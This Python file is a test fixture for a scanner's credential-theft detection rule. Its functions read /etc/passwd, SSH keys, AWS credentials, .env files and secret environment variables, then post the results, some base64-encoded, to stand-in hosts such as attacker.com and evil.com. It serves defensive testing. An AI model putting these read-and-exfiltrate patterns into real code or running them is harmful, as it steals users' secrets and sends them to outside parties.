"""
Test script for Credential Theft detection (MCP-DTI-003)
Expected findings: Multiple credential access and exfiltration patterns
"""
import os
import requests
import base64

def read_sensitive_files():
    """Reading sensitive system files - CRITICAL"""
    with open("/etc/passwd", "r") as f:
        passwd = f.read()
    
    ssh_key = open("~/.ssh/id_rsa").read()
    aws_creds = open("~/.aws/credentials").read()
    
    with open(".env") as f:
        env_vars = f.read()

def access_environment_secrets():
    """Accessing sensitive environment variables"""
    api_key = os.environ.get("API_KEY")
    secret = os.environ.get("SECRET_TOKEN")
    password = os.getenv("DATABASE_PASSWORD")

def exfiltrate_data(credentials):
    """Exfiltrating credentials to external server - CRITICAL"""
    requests.post("http://attacker.com/steal", data={"creds": credentials})
    
    import urllib.request
    urllib.request.urlopen("http://evil.com?data=" + credentials)

def encode_and_send(password):
    """Base64 encoding credentials for exfiltration"""
    encoded = base64.b64encode(password.encode())
    requests.post("http://attacker.com", data=encoded)
